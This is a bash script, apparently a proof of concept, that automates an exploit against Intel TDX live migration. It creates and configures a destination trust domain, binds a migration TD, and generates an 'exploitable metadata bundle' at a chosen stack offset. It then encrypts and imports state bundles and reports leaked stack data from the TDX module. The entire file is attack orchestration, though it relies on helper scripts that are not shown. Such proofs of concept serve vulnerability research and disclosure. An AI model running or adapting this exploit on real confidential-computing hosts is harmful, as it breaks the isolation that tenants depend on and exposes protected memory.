#!/bin/bash

DST_TD_NAME="dst_td"
MIG_TD_NAME="mig_td"

rm state.pickle
clear

echo -n "Input DST_TD_HKID: "
read DST_TD_HKID

echo -n "Input Stack Offset To Leak: "
read STACK_OFFSET_TO_LEAK

sleep 1
echo -e "\n[%%] Adding migration TD to the state..."
echo "host-vmm: python tdxamine.py add_td_by_pid `pgrep -f -o qemu` $MIG_TD_NAME"
python tdxamine.py add_td_by_pid `pgrep -f -o qemu` $MIG_TD_NAME

MIG_TD_PA=$(python tdxamine.py print_tdr_pa_from_name $MIG_TD_NAME)

sleep 1
echo -e "\n[%%] Creating destination TD..."
echo "host-vmm: python tdh_mng_create.py $DST_TD_NAME --hkid $DST_TD_HKID"
python tdh_mng_create.py $DST_TD_NAME --hkid $DST_TD_HKID

DST_TD_PA=$(python tdxamine.py print_tdr_pa_from_name $DST_TD_NAME)

sleep 1
echo -e "\n[%%] Configuring destination TD key..."
echo "host-vmm: python tdh_mng_key_config.py $DST_TD_PA"
python tdh_mng_key_config.py $DST_TD_PA

sleep 1
echo -e "\n[%%] Allocating TDCX pages for the destiantion TD..."
echo "host-vmm: python tdh_mng_addcx.py $DST_TD_PA"
python tdh_mng_addcx.py $DST_TD_PA

sleep 1
echo -e "\n[%%] Binding migration TD to the destination TD..."
echo "host-vmm: python tdh_servtd_bind.py $DST_TD_PA $MIG_TD_PA"
python tdh_servtd_bind.py $DST_TD_PA $MIG_TD_PA

sleep 1
echo -e "\n[%%] Creating destination migration stream..."
echo "host-vmm: python tdh_mig_stream_create.py $DST_TD_PA"
python tdh_mig_stream_create.py $DST_TD_PA

echo -e "\n[!] Instruct the migration TD to assign a key (press any key to continue)..."
read pause
clear

echo -e "\n[%%] Creating exploitable metadata bundle..."
echo "host-vmm: python melllvar.py $STACK_OFFSET_TO_LEAK vp0.melllvar.data vp0.melllvar.mbmd"
python melllvar.py $STACK_OFFSET_TO_LEAK vp0.melllvar.data vp0.melllvar.mbmd

echo -e "\n[!] Press any key to run the exploit..."
read pause

echo -e "\n[%%] Encrypting immutable metadata bundle..."
echo "host-vmm: python mig_bundle_encrypt.py 0xde-0x7e-0xc7-0xed immutable immutable.data immutable.mbmd immutable.encrypted"
python mig_bundle_encrypt.py 0xde-0x7e-0xc7-0xed immutable immutable.data immutable.mbmd immutable.encrypted

sleep 1
echo -e "\n[%%] Importing immutable state..."
echo "host-vmm: python tdh_import_state_immutable.py $DST_TD_PA immutable.mbmd immutable.encrypted"
python tdh_import_state_immutable.py $DST_TD_PA immutable.mbmd immutable.encrypted

echo -e "\n[%%] Encrypting TD metadata bundle..."
echo "host-vmm: python mig_bundle_encrypt.py 0xde-0x7e-0xc7-0xed td td.data td.mbmd td.encrypted"
python mig_bundle_encrypt.py 0xde-0x7e-0xc7-0xed td td.data td.mbmd td.encrypted

sleep 1
echo -e "\n[%%] Importing TD state..."
echo "host-vmm: python tdh_import_state_td.py $DST_TD_PA td.mbmd td.encrypted"
python tdh_import_state_td.py $DST_TD_PA td.mbmd td.encrypted

sleep 1
echo -e "\n[%%] Creating VP..."
echo "host-vmm: python tdh_vp_create.py $DST_TD_PA"
python tdh_vp_create.py $DST_TD_PA

sleep 1
echo -e "\n[%%] Allocating TDCX pages for the VP..."
echo "host-vmm: python tdh_vp_addcx.py $DST_TD_PA 0"
python tdh_vp_addcx.py $DST_TD_PA 0

echo -e "\n[%%] Encrypting VP metadata bundle..."
echo "host-vmm: python mig_bundle_encrypt.py 0xde-0x7e-0xc7-0xed vp vp0.melllvar.data vp0.melllvar.mbmd vp0.melllvar.encrypted"
python mig_bundle_encrypt.py 0xde-0x7e-0xc7-0xed vp vp0.melllvar.data vp0.melllvar.mbmd vp0.melllvar.encrypted

sleep 1
echo -e "\n[%%] Importing VP state..."
echo "host-vmm: python tdh_import_state_vp.py $DST_TD_PA 0 vp0.melllvar.mbmd vp0.melllvar.encrypted"
python tdh_import_state_vp.py $DST_TD_PA 0 vp0.melllvar.mbmd vp0.melllvar.encrypted

echo -e "\n[+] Stack Data Leaked (see extended error information 1)."
